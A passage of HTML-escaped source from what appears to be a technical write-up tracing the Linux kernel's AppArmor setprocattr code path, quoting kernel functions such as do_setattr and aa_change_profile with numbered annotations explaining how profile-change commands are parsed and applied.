class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;hlist_for_each_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;security_hook_heads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------------&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_hooks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__ro_after_init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LSM_HOOK_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [7]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_setprocattr()&lt;/code&gt; first converts the target filename into an enum value [8], then calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_setattr()&lt;/code&gt; to handle the operation [9].&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apparmor_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsm_name_to_attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [8]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do_setattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [9]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lsm_name_to_attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_CURRENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_setattr()&lt;/code&gt; begins by parsing the input, where the written data is interpreted in the format &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&amp;lt;command&amp;gt; &amp;lt;profile&amp;gt;&quot;&lt;/code&gt;. It then calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; with different parameters based on the &lt;strong&gt;target file&lt;/strong&gt; and the &lt;strong&gt;command&lt;/strong&gt; value.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_setattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_CURRENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;changeprofile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_NOFLAGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;permprofile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_TEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;stack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;stack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
                             &lt;span class=&quot;n&quot;&gt;AA_CHANGE_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; determines how a profile is applied based on different flags. First, it retrieves the profile object corresponding to the user-provided profile name [10]. Then, it performs different profile updates based on the flags.&lt;/p&gt;

&lt;p&gt;If the flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_STACK&lt;/code&gt; is included, AppArmor applies another profile on top of the existing one. The flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_TEST&lt;/code&gt; is used for testing, meaning the profile will not actually be applied.&lt;/p&gt;

&lt;p&gt;If neither the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_STACK&lt;/code&gt; nor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_TEST&lt;/code&gt; flags are set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; creates an AppArmor label object using the retrieved profile [11], and then applies the new label to the current process via either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_replace_current_label()&lt;/code&gt; [12] or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_set_current_onexec()&lt;/code&gt; [13].&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fqname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fqname&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* profile name */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [10]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn_label_build_in_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [11]&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;aa_get_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;aa_get_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_replace_current_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [12]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;aa_put_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
